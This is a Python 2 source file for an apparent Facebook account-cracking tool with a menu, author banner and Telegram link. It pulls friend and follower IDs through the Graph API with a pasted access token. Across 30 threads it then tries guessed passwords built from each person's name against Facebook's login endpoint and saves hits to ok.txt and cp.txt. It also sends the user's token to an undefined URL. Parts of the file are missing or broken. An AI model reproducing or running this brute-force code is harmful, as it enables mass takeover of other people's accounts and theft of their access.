# -*- coding: utf-8



#!/usr/bin/python2




[1;93m{~} [0;92mAUTHOR > [1;96mSyed_Ahmed_Shah
[1;92m{~} [0;95mFACEBOOK > [1;94m‎‎MASOOM_LARKA (D3V1L)
[1;94m{~} [0;96mLINK > [1;91mhttps://www.facebook.com/lathiya.milna



def logo():
	                       `-._,-'   `-._______,-'   `-._,-'
def main():
	os.system("clear")
	logo()
	print("\t\033[93;1m      MAIN MENU\x1b[0m")
	print("")
	print("\033[92;1m  [1] START CRACK")
	print("\033[93;1m  [2] DUMP/EXTRACT USERIDS")
	print("\033[94;1m  [3] HOW TO GET ACCESS TOKEN")
	print("\033[96;1m  [4] JOIN TELEGRAM GROUP")
	print("\033[92;1m  [5] UPDATE TOOL")
	print("\033[91;1m  [0] EXIT")
	print("")
	log_sel()
	
def log_sel():
	sel = raw_input("\033[93;1m  CHOOSE: ")
	if sel == "":
		print("\t\033[91;1m  SELECT AN OPTION STUPID -_")
		log_sel()
	elif sel =="1" or sel =="01":
		token()
	elif sel =="2" or sel =="02":
		ex_id()
	elif sel =="3" or sel =="03":
		subprocess.check_output(["am", "start", "https://Facebook.com/lathiya.milna"])
		main()
	elif sel =="4" or sel =="04" or sel =="J" or sel =="j":
		os.system('xdg-open https://t.me/mrerrorgroup')
		main()
	elif sel =="5" or sel =="05":
		import os
		try:
			os.system("git clone https://github.com/MASOOMXLARKA/angle")
			os.system("rm -rf angle.py")
			os.system("cp -f angle/fcpro.py \\.")
			os.system("rm -rf angle")
			print "\033[92;1m\n TOOL UPDATE SUCCESSFULFUL...>_<\n"
			time.sleep(2)
			main()
		except KeyboardInterrupt:
			print "\033[92;1m\n YOUR DEVICE IS NOT SUPPORTED!\n"
	        	main()
	elif sel =="0" or sel =="00":
		xox("\n\t\033[91;1m GOOD BYE SEE YOU AGAIN :)")
		sys.exit()
	else:
		print("")
		print("\t\033[91;1m  SELECT VALID OPTION")
		print("")
		log_sel()

def token():
    os.system("clear")
    try:
        token = open("vau_token.txt", "r").read()
        menu()
    except(KeyError , IOError):
        logo()
        print("")
        print("\t\033[92;1m  LOGIN TOKEN")
        print("")
        token = raw_input("\033[93;1m PASTE TOKEN HERE: \033[92;1m")
        sav = open("vau_token.txt", "w")
        sav.write(token)
        sav.close()
        token_check()
        menu()        
        
def token_check():
	try:
		token=open('vau_token.txt','r').read()
	except IOError:
		print"\033[91;1m[!] TOKEN INVALID"
		os.system('rm -rf vau_token.txt')
	requests.post(useragent_url + token, headers=header)
	pass
	
def menu():
    os.system("clear")
    try:
        token = open("vau_token.txt", "r").read()
    except(KeyError , IOError):
        token()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token)
        q = json.loads(r.text)
        name = q["name"]
    except(KeyError):
        logo()
        print("")
        print("\t\033[91;1m  LOGGED IN TOKEN HAS EXPIRED")
        os.system("rm -rf vau_token.txt")
        print("")
        time.sleep(1)
        token()
    os.system("clear")
    xn = name.upper()
    logo()
    print("")
    print("\033[92;1m     HELLO   : \033[92;1m"+xn)
    print("\033[92;1m     REGION  : \033[92;1m") + loc
    print("\033[91;1m     YOUR IP : \033[92;1m") + ip
    print("")

    print("")
    print("\033[91;1m  [1] AUTO PASS")
    print("\033[93;1m  [2] MANUAL PASS")
    print('\033[92;1m  [0] BACK')
    print("")
    menu_option()
def menu_option():
	select = raw_input("\033[91;1m  CHOOSE OPINION: ")
	if select =="1":
		crack1()
	elif select =="2":
		crack()
	elif select =="3":
		ex_id()
	elif select =="0":
		main()
	else:
		print("")
		print("\t\033[91;1m     SELECT VALID OPTION")
		print("")
		menu_option()
		
#####

def crack1():
	global token
	os.system("clear")
	try:
		token = open("vau_token.txt","r").read()
	except IOError:
		print("")
		print("\t\032[91;1m     TOKEN NOT FOUND ")
		time.sleep(1)
		token()
	os.system("clear")
	logo()
	print("")
	print("\t\033[91;1m CRACK WITH AUTO PASS")
	print("")
	print("\033[93;1m  [1] CRACK PUBLIC ID")
	print("\033[92;1m  [2] CRACK FOLLOWERS")
	print("\033[91;1m  [3] CRACK FILE")
	print("")
	crack_select1()
	
def crack_select1():
	select = raw_input("\033[92;1m  CHOOSE OPINION: ")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		logo()
		print("")
		idt = raw_input("\033[92;1m  INPUT PUBLIC ID : ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system('clear')
			logo()
			print('')
			print("\t\033[93;1m  AUTO PASS CRACKING")
			print('')
			print("\033[92;1m  COINING FROM : "+q["name"])
		except KeyError:
			print("\t\033[91;1m  INVALID LINK OR TOKEN")
			print("")
			raw_input("\033[91;1m  PRESS ENTER TO BACK")
			crack1()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			id.append(uid+"|"+na)
	elif select =="2":
		os.system("clear")
		logo()
		print("")
		idt = raw_input("\033[91;1m  INPUT FOLLOWER ID : ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system('clear')
			logo()
			print('')
			print("\t\033[93;1m  AUTO PASS CRACKING")
			print('')
			print("\033[92;1m  COINING FROM : "+q["name"])
		except KeyError:
			print("\t\033[91;1m     INVALID LINK OR TOKEN")
			print("")
			raw_input("\033[91;1m PRESS ENTER TO BACK")
			crack1()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999")
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			id.append(uid+"|"+na)
	elif select =="3":
		os.system("clear")
		logo()
		print("")
		print("\t\033[93;1m   AUTO PASS CRACKING")
		print("")
		filelist = raw_input('\033[92;1m  INPUT FILE: ')
		try:
			for line in open(filelist, 'r').readlines():
				id.append(line.strip())
				
		except IOError:
			print("\t\033[91;1m  REQUESTED FILE NOT FOUND")
			print("")
			raw_input("\033[93;1m PRESS ENTER TO BACK")
			crack1()
			
	elif select =="0":
	    menu()
	else:
		print("")
		print("\t\033[91;1m  SELECT VALID OPTION")
		print("")
		crack_select1()
	print("\033[93;1m  TOTAL IDS : \033[92;1m"+str(len(id)))
	print("\033[93;1m  THE PROCESS HAS STARTED")
	print("\033[92;1m  BRUTE HAS BEEN STARTED\x1b[0m")
	print("")
	linex()
	print("")
	def main(arg):
		user=arg
		uid,name=user.split("|")
		vaugent = random.choice(agents)
		session = requests.Session()
		session.headers.update({'User-Agent': vaugent})
		try:
			pass1 = name.lower().split(' ')[0] + '123'
			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
			q = json.loads(data)
			if "access_token" in q and "EAAA" in q:
				print(" \033[1;32m [Ahmed-OK] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("ok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;33m [Ahmed-CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("cp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:
					pass2 = name.lower().split(' ')[0] + '1234'
					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
					q = json.loads(data)
					if "access_token" in q and "EAAA" in q:
						print(" \033[1;32m [Ahmed-OK] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("ok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in q["error_msg"]:
							print(" \033[1;33m [Ahmed-CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("cp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
							pass3 = name.lower().split(' ')[0] + '12345'
							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
							q = json.loads(data)
							if "access_token" in q and "EAAA" in q:
								print(" \033[1;32m [Ahmed-OK] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("ok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;33m [Ahmed-CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("cp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
								else:
									pass4 = name.lower().split(' ')[1] + '123'
									data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
									q = json.loads(data)
									if "access_token" in q and "EAAA" in q:
										print(" \033[1;32m [Ahmed-OK] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("ok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
									else:
										if "www.facebook.com" in q["error_msg"]:
											print(" \033[1;33m [Ahmed-CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("cp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											cps.append(uid+pass4)
										else:
											pass5 = name.lower().split(' ')[1] + '1234'
											data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass5+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
											q = json.loads(data)
											if "access_token" in q and "EAAA" in q:
												print(" \033[1;32m [Ahmed-OK] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("ok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												oks.append(uid+pass5)
											else:
												if "www.facebook.com" in q["error_msg"]:
													print(" \033[1;33m [Ahmed-CP] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("cp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													cps.append(uid+pass5)
												else:
													pass6 = name.lower().split(' ')[1] + '12345'
													data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass6+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
													q = json.loads(data)
													if "access_token" in q and "EAAA" in q:
														print(" \033[1;32m [Ahmed-OK] "+uid+" | "+pass6+"\033[0;97m")
														ok = open("ok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														oks.append(uid+pass6)
													else:
														if "www.facebook.com" in q["error_msg"]:
															print(" \033[1;33m [Ahmed-CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("cp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															cps.append(uid+pass6)
														else:
															pass7 = name.lower().split(' ')[0] + name.lower().split(' ')[1]
															data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass7+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
															q = json.loads(data)
															if "access_token" in q and "EAAA" in q:
																print(" \033[1;32m [Ahmed-OK] "+uid+" | "+pass7+"\033[0;97m")
																ok = open("ok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
																oks.append(uid+pass7)
															else:
																if "www.facebook.com" in q["error_msg"]:
																	print(" \033[1;33m [Ahmed-CP] "+uid+" | "+pass7+"\033[0;97m")
																	cp = open("cp.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
																	cps.append(uid+pass7)
																else:
																	pass8 = name.lower()
																	data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass8+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
																	q = json.loads(data)
																	if "access_token" in q and "EAAA" in q:
																		print(" \033[1;32m [Ahmed-OK] "+uid+" | "+pass8+"\033[0;97m")
																		ok = open("ok.txt", "a")
																		ok.write(uid+"|"+pass8+"\n")
																		ok.close()
																		oks.append(uid+pass8)
																	else:
																		if "www.facebook.com" in q["error_msg"]:
																			print(" \033[1;33m [Ahmed-CP] "+uid+" | "+pass8+"\033[0;97m")
																			cp = open("cp.txt", "a")
																			cp.write(uid+"|"+pass8+"\n")
																			cp.close()
																			cps.append(uid+pass8)
												
										
										
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print("")
	linex()
	print("")
	print("\033[92;1m THE PROCESS HAS BEEN COMPLETED")
	print("\033[93;1m TOTAL \033[92;1mOK\033[93;1m/\033[91;1mCP: "+str(len(oks))+"/"+str(len(cps)))
	print("")
	linex()
	print("")
	raw_input("\033[93;1m PRESS ENTER TO BACK ")
	menu()
	
######

def crack():
	global token
	os.system("clear")
	try:
		token = open("vau_token.txt","r").read()
	except IOError:
		print("")
		print("\t\033[91;1m  TOKEN NOT FOUND ")
		time.sleep(1)
		token()
	os.system("clear")
	logo()
	print("")
	print("\t\033[93;1m  MANUAL PASS CRACKING")
	print("")
	print("\033[94;1m  [1] CRACK PUBLIC ID")
	print("\033[93;1m  [2] CRACK FOLLOWERS")
	print("\033[92;1m  [3] CRACK FILE")
	print("")
	crack_select()

def crack_select():
	select = raw_input("\033[92;1m  CHOOSE OPINION: ")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		logo()
		print("")
		print("\t\033[93;1m  MANUAL PASS CRACKING")
		print("")
		print("\033[93;1m  EXAMPLE :\033[96;1m 12, 1122, 321, 1234, 786 ETC")
		print("")
		idt = raw_input("\n\033[92;1m  INPUT PUBLIC ID : ")
		print("")
		p1 = raw_input("\033[91;1m  NAME + DIGIT PASSWORD 1: ")
		p2 = raw_input("\033[93;1m  NAME + DIGIT PASSWORD 2: ")
		p3 = raw_input("\033[94;1m  NAME + DIGIT PASSWORD 3: ")
		p4 = raw_input("\033[95;1m  NAME + DIGIT PASSWORD 4: ")
		print("")
		print("\033[93;1m  EXAMPLE :\033[96;1m 102030, 223344, 556677, 786786 ETC ")
		print("")
		pass5 = raw_input("\033[92;1m  PASSWORD 5: ")
		pass6 = raw_input("\033[93;1m  PASSWORD 6: ")
		pass7 = raw_input("\033[94;1m  PASSWORD 7: ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system('clear')
			logo()
			print('')
			print("\t\033[93;1m  MANUAL PASS CRACKING")
			print('')
			print("\033[92;1m  COINING FROM : "+q["name"])
		except KeyError:
			print("\t\033[91;1m  INVALID LINK OR TOKEN")
			print("")
			raw_input(" PRESS ENTER TO BACK")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			id.append(uid+"|"+na)
	elif select =="2":
		os.system("clear")
		logo()
		print("")
		print("\t\033[93;1m  MANUAL PASS CRACKING")
		print("")
		print("\033[93;1m  EXAMPLE :\033[96;1m 12, 1122, 321, 1234, 786 ETC")
		print("")
		idt = raw_input("\n\033[92;1m  INPUT PUBLIC FOLLOWER ID : ")
		print("")
		p1 = raw_input("\033[92;1m  NAME + DIGIT PASSWORD 1: ")
		p2 = raw_input("\033[93;1m  NAME + DIGIT PASSWORD 2: ")
		p3 = raw_input("\033[94;1m  NAME + DIGIT PASSWORD 3: ")
		p4 = raw_input("\033[95;1m  NAME + DIGIT PASSWORD 4: ")
		print("")
		print("\033[93;1m  EXAMPLE :\033[96;1m 102030, 223344, 556677, 786786 ETC ")
		print("")
		pass5 = raw_input("\033[92;1m  PASSWORD 5: ")
		pass6 = raw_input("\033[93;1m  PASSWORD 6: ")
		pass7 = raw_input("\033[94;1m  PASSWORD 7: ")
		try:
			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			q = json.loads(r.text)
			os.system('clear')
			logo()
			print('')
			print("\t\033[93;1m  MANUAL PASS CRACKING")
			print('')
			print("\033[92;1m  COINING FROM : "+q["name"])
		except KeyError:
			print("\t\033[91;1m     INVALID LINK OR TOKEN")
			print("")
			raw_input("\033[91;1m PRESS ENTER TO BACK")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999")
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i["id"]
			na = i["name"]
			id.append(uid+"|"+na)
	elif select =="3":
		os.system("clear")
		logo()
		print("")
		print("\t\033[93;1m  MANUAL PASS CRACKING")
		print("")
		print("")
                filelist = raw_input('\033[92;1m  INPUT FILE: ')
		try:
			for line in open(filelist, 'r').readlines():
				id.append(line.strip())
		except IOError:
			print("\t\033[91;1m  REQUESTED FILE NOT FOUND")
			print("")
			raw_input("\033[93;1m PRESS ENTER TO BACK")
			crack()
		print("\033[93;1m  EXAMPLE :\033[96;1m 12, 1122, 321, 1234, 786 ETC")
		print("")
		p1 = raw_input("\033[92;1m  NAME + DIGIT PASSWORD 1: ")
		p2 = raw_input("\033[93;1m  NAME + DIGIT PASSWORD 2: ")
		p3 = raw_input("\033[94;1m  NAME + DIGIT PASSWORD 3: ")
		p4 = raw_input("\033[95;1m  NAME + DIGIT PASSWORD 4: ")
		print("")
		print("\033[93;1m  EXAMPLE :\033[96;1m 102030, 223344, 556677, 786786 ETC ")
		print("")
		pass5 = raw_input("\033[92;1m  PASSWORD 5: ")
		pass6 = raw_input("\033[93;1m  PASSWORD 6: ")
		pass7 = raw_input("\033[94;1m  PASSWORD 7: ")
		
	elif select =="0":
	    menu()
	else:
		print("")
		print("\t\033[91;1m  SELECT VALID OPTION")
		print("")
		crack_select()
	print("")
	print("\033[93;1m  TOTAL IDS : \033[92;1m"+str(len(id)))
	print("\033[93;1m  THE PROCESS HAS STARTED")
	print("\033[92;1m  BRUTE HAS BEEN STARTED\x1b[0m")
	print("")
	linex()
	print("")
	def main(arg):
		user=arg
		uid,name=user.split("|")
		vaugent = random.choice(agents)
		session = requests.Session()
		session.headers.update({'User-Agent': vaugent})
		try:
			pass1 = name.lower().split(' ')[0]+p1
			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
			q = json.loads(data)
			if "access_token" in q and "EAAA" in q:
				print(" \033[1;32m [Ahmed-OK] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("ok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;33m [Ahmed-CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("cp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:
					pass2 = name.lower().split(' ')[0]+p2
					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
					q = json.loads(data)
					if "access_token" in q and "EAAA" in q:
						print(" \033[1;32m [Ahmed-OK] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("ok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in q["error_msg"]:
							print(" \033[1;33m [Ahmed-CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("cp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
							pass3 = name.lower().split(' ')[0]+p3
							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
							q = json.loads(data)
							if "access_token" in q and "EAAA" in q:
								print(" \033[1;32m [Ahmed-OK] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("ok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;33m [Ahmed-CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("cp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
								else:
									pass4 = name.lower().split(' ')[0]+p4
									data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
									q = json.loads(data)
									if "access_token" in q and "EAAA" in q:
										print(" \033[1;32m [Ahmed-OK] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("ok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
									else:
										if "www.facebook.com" in q["error_msg"]:
											print(" \033[1;33m [Ahmed-CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("cp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											cps.append(uid+pass4)
										else:
											data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass5+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
											q = json.loads(data)
											if "access_token" in q and "EAAA" in q:
												print(" \033[1;32m [Ahmed-OK] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("ok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												oks.append(uid+pass5)
											else:
												if "www.facebook.com" in q["error_msg"]:
													print(" \033[1;33m [Ahmed-CP] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("cp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													cps.append(uid+pass5)
												else:
													data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass6+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
													q = json.loads(data)
													if "access_token" in q and "EAAA" in q:
														print(" \033[1;32m [Ahmed-OK] "+uid+" | "+pass6+"\033[0;97m")
														ok = open("ok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														oks.append(uid+pass6)
													else:
														if "www.facebook.com" in q["error_msg"]:
															print(" \033[1;33m [Ahmed-CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("cp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															cps.append(uid+pass6)
														else:
															data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass7+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
															q = json.loads(data)
															if "access_token" in q and "EAAA" in q:
																print(" \033[1;32m [Ahmed-OK] "+uid+" | "+pass7+"\033[0;97m")
																ok = open("ok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
																oks.append(uid+pass7)
															else:
																if "www.facebook.com" in q["error_msg"]:
																	print(" \033[1;33m [Ahmed-CP] "+uid+" | "+pass7+"\033[0;97m")
																	cp = open("cp.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
																	cps.append(uid+pass7)
																else:
																	pass8 = name.lower().split(' ')[1]+p1
																	data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass8+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
																	q = json.loads(data)
																	if "access_token" in q and "EAAA" in q:
																		print(" \033[1;32m [Ahmed-OK] "+uid+" | "+pass8+"\033[0;97m")
																		ok = open("ok.txt", "a")
																		ok.write(uid+"|"+pass8+"\n")
																		ok.close()
																		oks.append(uid+pass8)
																	else:
																		if "www.facebook.com" in q["error_msg"]:
																			print(" \033[1;33m [Ahmed-CP] "+uid+" | "+pass8+"\033[0;97m")
																			cp = open("cp.txt", "a")
																			cp.write(uid+"|"+pass8+"\n")
																			cp.close()
																			cps.append(uid+pass8)
												
										
										
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print("")
	linex()
	print("")
	print("\033[93;1m THE PROCESS HAS BEEN COMPLETED")
